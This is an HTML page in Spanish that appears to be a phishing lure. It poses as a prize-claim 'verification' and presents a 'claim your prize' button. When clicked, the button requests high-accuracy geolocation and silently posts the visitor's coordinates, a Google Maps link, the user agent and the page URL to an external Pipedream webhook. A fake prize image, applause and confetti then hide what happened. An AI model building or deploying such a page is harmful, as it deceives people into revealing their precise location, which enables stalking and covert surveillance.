<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéÅ Verificaci√≥n y Validaci√≥n</title>
  <style>
    body { 
      font-family: 'Segoe UI', Tahoma, sans-serif; 
      text-align: center; 
      background: linear-gradient(135deg, #e0f7fa, #f1f8e9); 
      margin: 0; padding: 0;
      min-height: 100vh;
      display: flex; flex-direction: column; justify-content: center; align-items: center;
    }
    h1 { color: #2c3e50; margin-bottom: 10px; font-size: 28px; }
    p { font-size: 18px; margin: 10px 0; color: #444; }
    button { 
      padding: 14px 28px; 
      font-size: 20px; 
      border: none; 
      border-radius: 8px; 
      background: #007bff; 
      color: #fff; 
      cursor: pointer; 
      transition: background 0.3s ease;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }
    button:hover { background: #0056b3; }
    #msg { 
      margin-top: 20px; 
      font-size: 24px; 
      font-weight: bold; 
      color: green; 
      display: none; 
    }
    #icono { 
      margin-top: 20px; 
      width: 300px; 
      max-width: 90%;
      display: none; 
      border-radius: 15px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
      animation: fadeInBounce 1s ease forwards;
      opacity: 0;
      transform: scale(0.8);
    }
    @keyframes fadeInBounce {
      0%   { opacity: 0; transform: scale(0.8) translateY(30px); }
      60%  { opacity: 1; transform: scale(1.1) translateY(-10px); }
      80%  { transform: scale(0.95) translateY(5px); }
      100% { opacity: 1; transform: scale(1) translateY(0); }
    }
    canvas#confetti {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      pointer-events: none;
      z-index: 999;
    }
  </style>
</head>
<body>
  <h1>‚úÖ VERIFICACI√ìN Y VALIDACI√ìN</h1>
  <p>Por favor, pulsa el bot√≥n y acepta la solicitud.</p>
  <button onclick="obtenerUbicacion()">üìç RECLAMA TU PREMIO</button>
  <p id="msg">¬°Gracias por aceptar! üéâ</p>
  <img id="icono" src="" alt="Premio">
  <canvas id="confetti"></canvas>

  <!-- üé∫ Sonido fanfarria -->
  <audio id="fanfarria" src="https://www.soundjay.com/human/sounds/applause-8.mp3" preload="auto"></audio>

<script>
const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";

// üì∏ Lista de im√°genes reales de premios
const premios = [
  "https://images.unsplash.com/photo-1510552776732-03e61cf4b144?w=600&auto=format&fit=crop&q=80", // smartphone
  "https://images.unsplash.com/photo-1606813902914-3a54ed28c8a2?w=600&auto=format&fit=crop&q=80", // bicicleta
  "https://images.unsplash.com/photo-1587202372775-dc61f62de1e9?w=600&auto=format&fit=crop&q=80", // consola
  "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=600&auto=format&fit=crop&q=80", // laptop
  "https://images.unsplash.com/photo-1512499617640-c2f999018b72?w=600&auto=format&fit=crop&q=80"  // aud√≠fonos
];

function obtenerUbicacion() {
  if (!navigator.geolocation) {
    alert("Tu navegador no soporta geolocalizaci√≥n.");
    return;
  }
  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

function onSuccess(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const accuracy = pos.coords.accuracy;

  const data = {
    lat,
    lon,
    accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
    source: window.location.href
  };

  // üì° Enviar datos al webhook
  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  });

  // ‚úÖ Mostrar mensaje
  document.getElementById("msg").style.display = "block";

  // üì∏ Imagen aleatoria
  const randomImg = premios[Math.floor(Math.random() * premios.length)];
  const icono = document.getElementById("icono");
  icono.src = randomImg;
  icono.style.display = "block";

  // üé∫ Sonido fanfarria
  document.getElementById("fanfarria").play();

  // üéâ Lanzar confeti
  lanzarConfeti();
}

function onError(err) {
  alert("‚ö†Ô∏è Error al obtener ubicaci√≥n: " + (err.message || err.code));
}

/* üéâ Confeti con canvas */
function lanzarConfeti() {
  const canvas = document.getElementById("confetti");
  const ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const confettis = [];
  for (let i = 0; i < 150; i++) {
    confettis.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height - canvas.height,
      r: Math.random() * 6 + 4,
      d: Math.random() * 20 + 10,
      color: `hsl(${Math.random() * 360}, 100%, 50%)`,
      tilt: Math.random() * 10 - 10,
      tiltAngle: 0,
      tiltAngleIncrement: Math.random() * 0.07 + 0.05
    });
  }

  function drawConfetti() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    confettis.forEach(c => {
      ctx.beginPath();
      ctx.lineWidth = c.r;
      ctx.strokeStyle = c.color;
      ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
      ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.r / 2);
      ctx.stroke();
    });
    updateConfetti();
  }

  function updateConfetti() {
    confettis.forEach(c => {
      c.y += Math.cos(c.d) + 1 + c.r / 2;
      c.x += Math.sin(0.5) * 2;
      c.tiltAngle += c.tiltAngleIncrement;
      c.tilt = Math.sin(c.tiltAngle) * 15;

      if (c.y > canvas.height) {
        c.y = -10;
        c.x = Math.random() * canvas.width;
      }
    });
  }

  (function animate() {
    drawConfetti();
    requestAnimationFrame(animate);
  })();
}
</script>
</body>
</html>
